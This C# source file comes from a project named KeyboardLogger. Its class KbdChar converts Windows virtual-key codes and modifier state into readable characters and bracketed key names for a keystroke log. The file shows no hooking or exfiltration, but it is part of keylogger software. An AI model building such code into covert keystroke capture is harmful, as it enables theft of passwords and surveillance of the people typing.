using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using KeyboardLogger.WindowsApi;

namespace KeyboardLogger.KeyLog
{
    class KbdChar
    {
        // data
        static VK oldVk;
        static bool[] Key;
        static char[] ShiftedNum = {
            ' ', '!', '\"', '#', '$', '%', '&', '\"', '(', ')',
            '*', '+', '<', '_', '>', '?', ')', '!', '@', '#',
            '$', '%', '^', '&', '*', '(', ':', ':', '<', '+',
            '>', '?', '@', 'A', 'B', 'C', 'D', 'E', 'F', 'G',
            'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q',
            'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', '{',
            '|', '}', '^', '_', '~', 'A', 'B', 'C', 'D', 'E',
            'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O',
            'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y',
            'Z', '{', '|', '}', '~', ' '
        };

        // properties
        static bool Scroll
        {
            get { return Key[(int)VK.SCROLL]; }
        }
        static bool Caps
        {
            get { return Key[(int)VK.CAPITAL]; }
        }
        static bool Num
        {
            get { return Key[(int)VK.NUMLOCK]; }
        }
        static bool Ctrl
        {
            get { return Key[(int)VK.LCONTROL] | Key[(int)VK.RCONTROL]; }
        }
        static bool Alt
        {
            get { return Key[(int)VK.LMENU] | Key[(int)VK.RMENU]; }
        }
        static bool Shift
        {
            get { return Key[(int)VK.LSHIFT] | Key[(int)VK.RSHIFT]; }
        }
        static bool Shifted
        {
            get { return Caps ^ Shift; }
        }


        // IsAlpha (ch)
        // - checks if character is alphabet
        static bool IsAlpha(char ch)
        {
            return (ch >= 'A' && ch <= 'Z') || (ch >= 'a' && ch <= 'z');
        }


        // LowerCase (ch)
        // - gives the lower case form of character
        static char LowerCase(char ch)
        {
            return (ch >= 'A' && ch <= 'Z') ? (char)(ch - 'A' + 'a') : ch;
        }


        // IsToggleKey (vk)
        // - tell if it is a toggle key
        static bool IsToggleKey(VK vk)
        {
            return vk == VK.SCROLL || vk == VK.CAPITAL || vk == VK.NUMLOCK;
        }


        // IsSpecialKey (vk)
        // - tell if it is a Special key
        static bool IsSpecialKey(VK vk)
        {
            return vk == VK.LSHIFT || vk == VK.RSHIFT || vk == VK.LCONTROL || vk == VK.RCONTROL || vk == VK.LMENU || vk == VK.RMENU;
        }


        // Init ()
        // - initialize
        public static void Init()
        {
            Key = new bool[256];
        }


        // Char (vkCode)
        // - gives the character representation of virtual key
        public static string Char(uint vkCode, bool active)
        {
            // update key state
            VK vk = (VK)vkCode;
            bool diff = oldVk != vk;
            oldVk = active ? vk : (VK)0;
            if (!IsToggleKey(vk)) Key[vkCode] = active;
            else if (active && diff) Key[vkCode] = !Key[vkCode];
            if (IsSpecialKey(vk)) return (active && diff) ? " [" + ((Keys)vkCode) + "] " : "";
            if (!active) return "";
            // get string format
            string ans = "";
            char ch = (char)User32.MapVirtualKey(vkCode, MapVK.MAPVK_VK_TO_CHAR);
            if (Ctrl || Alt || (Shift && !IsAlpha(ch)))
            {
                ans += " [";
                ans += Ctrl ? "Ctrl+" : "";
                ans += Alt ? "Alt+" : "";
                ans += Shift ? "Shift+" : "";
                ans += ((Keys)vkCode) +"] ";
                return ans;
            }
            ch = LowerCase(ch);
            if (ch >= ' ') ans += Shifted ? ShiftedNum[ch - ' '] : ch;
            else ans += " [" + ((Keys)vkCode) + "] ";
            return ans;
        }
    }
}
